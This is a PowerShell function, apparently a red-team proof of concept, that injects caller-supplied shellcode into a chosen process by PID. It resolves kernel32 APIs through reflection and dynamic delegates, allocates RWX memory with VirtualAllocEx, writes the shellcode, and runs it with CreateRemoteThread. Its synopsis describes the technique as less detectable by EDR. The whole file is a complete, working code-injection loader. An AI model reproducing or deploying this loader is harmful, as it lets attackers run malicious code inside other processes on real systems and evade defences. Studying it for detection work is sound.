function Invoke-ShellcodeViaRemoteThread
{
<#
.SYNOPSIS
    Injects and executes shellcode in a remote process using CreateRemoteThread.

    This is a straightforward proof-of-concept demonstrating how to inject shellcode into a
    remote process by allocating memory with RWX permissions, writing shellcode, and
    spawning a thread inside the target process with CreateRemoteThread.

    This technique is common and widely documented, but also less detectable by modern
    EDR products due to the use of VirtualAllocEx and CreateRemoteThread APIs.

    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER TargetPID
    Process ID of the remote target to inject into.

.PARAMETER Shellcode
    A byte array containing the shellcode to be injected.

.EXAMPLE
    PS C:\> Invoke-ShellcodeViaRemoteThread -TargetPID 1234 -Shellcode $Shellcode -Verbose
    VERBOSE: [+] Opened Handle To Process.
    VERBOSE: [+] Allocated Memory To 0x1883390148608.
    VERBOSE: [+] Shellcode [272] Written To 0x1883390148608.
    VERBOSE: [+] Created Thread [13724] And Is Executing.
    True
#>

	[CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [UInt32]$TargetPID,

        [Parameter(Mandatory)]
        [Byte[]]$Shellcode
    )

    function Get-Delegate
    {   
        # We can grab a function address easily, but to treat it as such has it's quirks.

        # Every function is tied to the name of it's method. The method must have a
        # brothering contructor, and a parenting type. The type must have a parenting
        # module. The module must have a parenting assembly.

        # So in reverse order, we create an assembly; under the assembly is a type,
        # so we create that; under the type is the constructor, and invocation method.
        # once that is built, we can then return it use ready.

        param(
            [Parameter(Mandatory)]
            [IntPtr]$FunctionAddress,

            [Parameter(Mandatory)]
            [Type[]]$ArgumentTypes,

            [Parameter()]
            [Type]$ReturnType=[Void]
        )

        # Create an in memory assembly where the delegate will reside.

        $AssemblyNameString             = "New Assembly"
        $AssemblyName                   = [Reflection.AssemblyName]::New($AssemblyNameString)
        $AssemblyBuilderAccess          = [Reflection.Emit.AssemblyBuilderAccess]::Run
        $Domain                         = [AppDomain]::CurrentDomain

        $AssemblyBuilder                = $Domain.DefineDynamicAssembly($AssemblyName, $AssemblyBuilderAccess)

        # Define the single module.

        $ModuleNameString               = "New Module"
        $EmitDebug                      = $false

        $ModuleBuilder                  = $AssemblyBuilder.DefineDynamicModule($ModuleNameString, $EmitDebug)

        # Define the single type.

        $TypeNameString                 = "New Type"
        $TypeAttributes                 = "Class, Public, Sealed, AnsiClass, AutoClass"
        $DelegateBaseType               = [MulticastDelegate]

        $TypeBuilder                    = $ModuleBuilder.DefineType($TypeNameString, $TypeAttributes, $DelegateBaseType)

        # Define the contructor needed.

        $ConstructorAttributes          = "RTSpecialName, HideBySig, Public"
        $ConstructorCallingConvention   = [Reflection.CallingConventions]::Standard
        $ImplementationFlags            = "Runtime, Managed"

        $ConstructorBuilder             = $TypeBuilder.DefineConstructor($ConstructorAttributes, $ConstructorCallingConvention, $ArgumentTypes)
        $ConstructorBuilder.SetImplementationFlags($ImplementationFlags)

        # Define the invocation method.

        $MethodNameString               = "Invoke"
        $MethodAttributes               = "Public, HideBySig, NewSlot, Virtual"

        $MethodBuilder                  = $TypeBuilder.DefineMethod($MethodNameString, $MethodAttributes, $ReturnType, $ArgumentTypes)
        $MethodBuilder.SetImplementationFlags($ImplementationFlags)

        # Create the delegate.

        $Delegate                       = $TypeBuilder.CreateType()
        $DelegateInstance               = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $Delegate)

        return $DelegateInstance
    }

    # System.dll contains all of our unconventional types.

    $Assemblies                         = [AppDomain]::CurrentDomain.GetAssemblies()
    $SystemAssembly                     = $null

    foreach ($Assembly in $Assemblies)
    {
        if ($Assembly.GlobalAssemblyCache -and $Assembly.Location.Split("\\")[-1] -eq "System.dll")
        {
            $SystemAssembly             = $Assembly
            break
        }
    }

    $UnsafeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods")
    $NativeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.NativeMethods")

    # Get the methods needed to grab functions within the dlls.

    $GetModuleHandle                    = $UnsafeMethodsType.GetMethod("GetModuleHandle")
    $GetProcAddress                     = $UnsafeMethodsType.GetMethod("GetProcAddress", [Reflection.BindingFlags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @([IntPtr], [String]), $null);
    
    # Get all of our address pointers to our needed functions.

    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))

    $OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "OpenProcess"))
    $VirtualAllocExAddress              = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "VirtualAllocEx"))
    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "WriteProcessMemory"))
    $CreateRemoteThreadAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "CreateRemoteThread"))

    # Create delegates with our function pointers.

    $OpenProcess                        = Get-Delegate $OpenProcessAddress @([Int], [Bool], [Int]) ([IntPtr])
    $VirtualAllocEx                     = Get-Delegate $VirtualAllocExAddress @([IntPtr], [IntPtr], [Int], [Int], [Int]) ([IntPtr])
    $WriteProcessMemory                 = Get-Delegate $WriteProcessMemoryAddress @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr]) ([Bool])
    $CreateRemoteThread                 = Get-Delegate $CreateRemoteThreadAddress @([IntPtr], [IntPtr], [Int], [IntPtr], [IntPtr], [Int], [IntPtr]) ([IntPtr])

    # Intialize all needed variables.

    $ShellcodeSize                      = $Shellcode.Length
    $BytesWritten                       = [IntPtr]::Zero

    $PROCESS_ALL_ACCESS                 = 0x001F0FFF
    $InheritHandle                      = $false

    # Open a handle to the target process.

    $ProcessHandle                      = $OpenProcess.Invoke($PROCESS_ALL_ACCESS, $InheritHandle, $TargetPID)

    $INVALID_HANDLE_VALUE               = [IntPtr]::New(-1)

    if (($ProcessHandle) -and ($ProcessHandle -ne $INVALID_HANDLE_VALUE))
    {
        Write-Verbose "[+] Opened Handle To Process."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] OpenProcess Failed: $FunctionError"
        $false
        return
    }

    # Allocate memory inside the target process space.

    $AddressPointer                     = [IntPtr]::Zero
    $MEM_COMMIT                         = 0x00001000
    $PAGE_EXECUTE_READWRITE             = 0x40

    $RemoteAddress                      = $VirtualAllocEx.Invoke($ProcessHandle, $AddressPointer, $ShellcodeSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

    if ($RemoteAddress)
    {
        Write-Verbose ("[+] Allocated Memory To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] VirtualAllocEx Failed: $FunctionError"
        $false
        return
    }

    # Write shellcode to the allocated memory.

    $Result                             = $WriteProcessMemory.Invoke($ProcessHandle, $RemoteAddress, $Shellcode, $ShellcodeSize, $BytesWritten)

    if ($Result)
    {
        Write-Verbose ("[+] Shellcode [$ShellcodeSize] Written To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WriteProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Create a thread pointing to our memory.

    $ThreadAttribute                    = [IntPtr]::Zero
    $StackSize                          = 0
    $Parameter                          = [IntPtr]::Zero
    $CreationFlags                      = 0
    $ThreadId                           = [IntPtr]::Zero

    $Result                             = $CreateRemoteThread.Invoke($ProcessHandle, $ThreadAttribute, $StackSize, $RemoteAddress, $Parameter, $CreationFlags, $ThreadId)

    if ($Result)
    {  
        Write-Verbose "[+] Created Thread [$ThreadId] And Is Executing."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!]  Failed: $FunctionError"
        $false
        return
    }

    $true
}
